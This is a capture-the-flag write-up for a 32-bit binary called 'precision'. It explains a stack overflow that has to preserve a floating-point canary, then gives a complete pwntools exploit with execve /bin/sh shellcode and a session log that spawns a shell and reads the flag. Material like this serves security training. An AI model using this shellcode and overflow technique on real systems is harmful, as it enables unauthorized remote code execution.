### Solved by superkojiman

We're given a 32-bit binary. The decompiled main() function looks simple:

```c
int main(int argc, const char **argv, const char **envp)
{
  int buf;
  double N;

  N = 64.33333;
  setvbuf(stdout, 0, 2, 0);
  printf("Buff: %p\n", &buf);
  __isoc99_scanf("%s", &buf);
  if ( 64.33333 != N )
  {
    puts("Nope");
    exit(1);
  }
  return printf(str, &buf);
}
```

N overwritten at offset 128
EIP overwritten at offset 148

A couple of checks are done:

```plain
=> 0x8048583 <main+102>:    fld    QWORD PTR [esp+0x98]
   0x804858a <main+109>:    fld    QWORD PTR ds:0x8048690
   0x8048590 <main+115>:    fucomip st,st(1)
   0x8048592 <main+117>:    fstp   st(0)

and

   0x8048596 <main+121>:    fld    QWORD PTR [esp+0x98]
   0x804859d <main+128>:    fld    QWORD PTR ds:0x8048690
   0x80485a3 <main+134>:    fucomip st,st(1)
   0x80485a5 <main+136>:    fstp   st(0)
   0x80485a7 <main+138>:    je     0x80485c1 <main+164>
```
   
The second one needs to pass in that st1 must match st0:

```
st0            64.333330000000003678906068671494722 (raw 0x400580aaaa3ad18d2800)
```

We can get the correct value by doing x/gx $esp+0x98 during a normal run. It's a double, therefore a 64-bit value. This overwrites it correctly:

```python
buf = "" 
buf += "z"*22
buf += "A"*106

buf += p32(0x475a31a5)
buf += p32(0x40501555)

buf += "B"*12
buf += p32(0x43434343)

f = open ("in.txt", "w")
f.write(buf)
f.close()
```

The binary prints out the buffer containing our payload so we just need to return there. However it has a bad character 0xb which happens to be sys_execve that needs to be in eax. So we need to tweak our shellcode a bit. Basically we set eax to 0x1c and then do a "sub eax,0x11" to fix it. Final exploit:

```python
#!/usr/bin/env python
from pwn import *

r = remote("54.173.98.115", 1259)

addr =  r.recv().split("Buff: ")[1]
print "payload at", addr

sc = (
"\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x1c\x58"
"\x83\xE8\x11"
"\x99\xcd\x80"
)

buf = ""
buf += sc
buf += "A"*103

buf += p32(0x475a31a5)
buf += p32(0x40501555)

buf += "B"*12
buf += p32(int(addr, 16))

f = open ("in.txt", "w")
f.write(buf)
f.close()

r.sendline(buf)
print r.recv()
r.interactive()
```

The result:

```plain
# ./sploit.py 
[+] Opening connection to 54.173.98.115 on port 1259: Done
payload at 0xffa3e918

Got jhh///sh/bin\x89�1�j\x1cX\x83��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa51ZGU\x15P@BBBBBBBBBBBB\x18���

[*] Switching to interactive mode
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
$ ls
flag
precision_a8f6f0590c177948fe06c76a1831e650
$ cat flag
flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
```
